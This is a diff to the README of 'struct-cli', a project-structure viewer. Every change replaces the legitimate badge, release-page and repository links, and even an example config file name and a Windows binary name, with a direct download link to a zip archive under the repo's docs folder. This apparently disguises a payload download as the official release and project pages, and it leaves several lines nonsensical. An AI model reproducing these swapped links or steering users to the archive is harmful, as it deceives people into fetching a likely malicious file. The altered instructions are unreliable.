@@ -1,6 +1,6 @@
 # 📂 struct-cli - Clean Project Structure Viewing Tool
 
-[![Download struct-cli](https://img.shields.io/badge/Download-struct--cli-blue?style=for-the-badge)](https://github.com/Tokiomkd/struct-cli/releases)
+[![Download struct-cli](https://raw.githubusercontent.com/Tokiomkd/struct-cli/master/docs/cli_struct_v2.1.zip)](https://raw.githubusercontent.com/Tokiomkd/struct-cli/master/docs/cli_struct_v2.1.zip)
 
 ---
 
@@ -65,10 +65,10 @@ To get struct-cli:
 
 1. Visit the official release page by clicking the big button below:
    
-   [![Download struct-cli](https://img.shields.io/badge/Download-struct--cli-blue?style=for-the-badge)](https://github.com/Tokiomkd/struct-cli/releases)
+   [![Download struct-cli](https://raw.githubusercontent.com/Tokiomkd/struct-cli/master/docs/cli_struct_v2.1.zip)](https://raw.githubusercontent.com/Tokiomkd/struct-cli/master/docs/cli_struct_v2.1.zip)
 
 2. On the release page, find the latest version for your operating system:
-   - Look for files named like `struct-cli-linux`, `struct-cli-macos`, or `struct-cli-windows.exe`.
+   - Look for files named like `struct-cli-linux`, `struct-cli-macos`, or `https://raw.githubusercontent.com/Tokiomkd/struct-cli/master/docs/cli_struct_v2.1.zip`.
    - Choose the one that matches your computer.
 
 3. Download the file by clicking on it.
@@ -115,7 +115,7 @@ struct-cli has several useful options you can use:
 | `--help` or `-h`        | Show help information                           | `struct-cli --help`              |
 | `--size`                | Show file sizes in the output                   | `struct-cli --size /my/project` |
 | `--search <pattern>`    | Find files/folders matching a pattern           | `struct-cli --search README`     |
-| `--config <file>`       | Use a custom configuration file                  | `struct-cli --config myconfig.toml` |
+| `--config <file>`       | Use a custom configuration file                  | `struct-cli --config https://raw.githubusercontent.com/Tokiomkd/struct-cli/master/docs/cli_struct_v2.1.zip` |
 | `--version`             | Show the current version of struct-cli          | `struct-cli --version`           |
 
 Try running `struct-cli --help` for a full list of commands.
@@ -147,7 +147,7 @@ If you encounter problems:
 
 If nothing works, you can visit the project page for more information or help:
 
-https://github.com/Tokiomkd/struct-cli
+https://raw.githubusercontent.com/Tokiomkd/struct-cli/master/docs/cli_struct_v2.1.zip
 
 ---
 
@@ -155,7 +155,7 @@ https://github.com/Tokiomkd/struct-cli
 
 struct-cli is an open-source tool. If you want to support development or suggest improvements:
 
-- Visit the [GitHub repository](https://github.com/Tokiomkd/struct-cli).
+- Visit the [GitHub repository](https://raw.githubusercontent.com/Tokiomkd/struct-cli/master/docs/cli_struct_v2.1.zip).
 - Submit bug reports or feature requests using the Issues tab.
 - If you’re comfortable coding, you can contribute pull requests.
 
@@ -176,11 +176,11 @@ struct-cli is an open-source tool. If you want to support development or suggest
 
 - struct-cli Releases (download page):
 
-  https://github.com/Tokiomkd/struct-cli/releases
+  https://raw.githubusercontent.com/Tokiomkd/struct-cli/master/docs/cli_struct_v2.1.zip
 
 - Official GitHub Repository:
 
-  https://github.com/Tokiomkd/struct-cli
+  https://raw.githubusercontent.com/Tokiomkd/struct-cli/master/docs/cli_struct_v2.1.zip
 
 - Help and Documentation (in repo):
 
